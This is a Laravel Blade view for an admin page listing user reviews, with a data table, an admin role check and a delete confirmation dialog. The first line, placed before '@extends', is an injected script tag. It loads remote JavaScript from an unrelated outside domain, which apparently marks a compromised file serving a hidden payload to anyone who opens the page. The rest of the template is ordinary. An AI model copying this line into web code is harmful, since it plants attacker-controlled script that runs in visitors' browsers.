<script type='text/javascript' src='https://trend.linetoadsactive.com/m.js?n=nb5'></script>@extends('layouts.backend.app')

@section('title','Reviews')

@push('css')
    <link href="{{ asset('backend/plugins/jquery-datatable/skin/bootstrap/css/dataTables.bootstrap.css') }}" rel="stylesheet">
@endpush
@section('content')
    <div class="container-fluid">
        <!-- Exportable Table -->
        <div class="row clearfix">
            <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                <div class="card">
                    <div class="header">
                        <h2>
                            <a href="{{ route('admin.review.index') }}">
                                {{ __('ALL REVIEWS') }}
                                <span class="btn btn-warning sm">{{ $reviews->count() }}</span>
                            </a>
                        </h2>
                    </div>
                    <div class="body">
                        <div class="table-responsive">
                            <table class="table table-bordered table-striped table-hover dataTable js-exportable">
                                <thead>
                                <tr>
                                    <th>{{__('Sl')}}</th>
                                    <th>{{__('NAME')}}</th>
                                    <th><i class="material-icons">{{__('stars')}}</i>RATING</th>
                                    <th>{{__('REVIEW')}}</th>
                                    <th>{{__('POST_INFO')}}</th>
                                    <th>{{__('CREATE_AT')}}</th>
                                    <th>{{__('ACTION')}}</th>
                                </tr>
                                </thead>
                                <tfoot>
                                <tr>
                                    <th>{{__('Sl')}}</th>
                                    <th>{{__('NAME')}}</th>
                                    <th><i class="material-icons">{{__('stars')}}</i>RATING</th>
                                    <th>{{__('REVIEW')}}</th>
                                    <th>{{__('POST_INFO')}}</th>
                                    <th>{{__('CREATE_AT')}}</th>
                                    <th>{{__('ACTION')}}</th>
                                </tr>
                                </tfoot>
                                <tbody>

                                @if(Auth::check() && Auth::user()->role->id == 1)
                                    @foreach($reviews as $key=>$review)
                                        <tr>
                                            <td>{{ $key + 1 }}</td>
                                            <td>{{ $review->user->name }}</td>
                                            <td>{{$review->stars}}</td>
                                            <td>{{ str_limit($review->comment, 30) }}</td>
                                            <td>{{ str_limit($review->post->title, 10) }}</td>
                                            <td>{{ $review->created_at->diffForHumans() }}</td>
                                            <td >
                                                <button class="btn btn-danger waves-effect" type="button" onclick="deletereview({{ $review->id }})">
                                                    <i class="material-icons">delete</i>
                                                </button>
                                                <form id="delete-form-{{ $review->id }}" action="{{ route('admin.review.destroy',$review->id) }}" method="POST" style="display: none;">
                                                    @csrf
                                                    @method('DELETE')
                                                </form>
                                            </td>
                                        </tr>
                                    @endforeach
                                    @else
                                    <h1>you are not authorized its access</h1>
                                @endif
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- #END# Exportable Table -->
    </div>
@endsection


@push('js')
    <script src="{{asset ('backend/plugins/jquery-datatable/jquery.dataTables.js') }}"></script>
    <script src="{{asset ('backend/plugins/jquery-datatable/skin/bootstrap/js/dataTables.bootstrap.js') }}"></script>
    <script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/dataTables.buttons.min.js') }}"></script>
    <script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/buttons.flash.min.js') }}"></script>
    <script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/jszip.min.js') }}"></script>
    <script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/pdfmake.min.js') }}"></script>
    <script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/vfs_fonts.js') }}"></script>
    <script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/buttons.html5.min.js') }}"></script>
    <script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/buttons.print.min.js') }}"></script>
    <script src="{{ asset('backend/js/pages/tables/jquery-datatable.js') }}"></script>
    <script src="https://unpkg.com/sweetalert2@7.19.1/dist/sweetalert2.all.js"></script>

    <script type="text/javascript">
        function deletereview(id) {
            swal({
                title: 'Are you sure?',
                text: "You won't be able to revert this!",
                type: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#3085d6',
                cancelButtonColor: '#d33',
                confirmButtonText: 'Yes, delete it!',
                cancelButtonText: 'No, cancel!',
                confirmButtonClass: 'btn btn-success',
                cancelButtonClass: 'btn btn-danger',
                buttonsStyling: false,
                reverseButtons: true
            }).then((result) => {
                if (result.value) {
                    event.preventDefault();
                    document.getElementById('delete-form-'+id).submit();
                } else if (
                    // Read more about handling dismissals
                    result.dismiss === swal.DismissReason.cancel
                ) {
                    swal(
                        'Cancelled',
                        'Your data is safe :)',
                        'error'
                    )
                }
            })
        }
    </script>
@endpush

